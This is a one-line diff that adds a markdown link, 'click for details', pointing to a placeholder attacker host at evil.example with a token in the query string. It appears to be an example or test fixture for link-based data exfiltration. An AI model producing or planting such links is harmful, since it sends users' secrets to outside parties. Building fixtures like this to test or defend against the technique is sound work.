@@ -1,0 +1,1 @@
+[click for details](https://evil.example/steal?token=abc123)
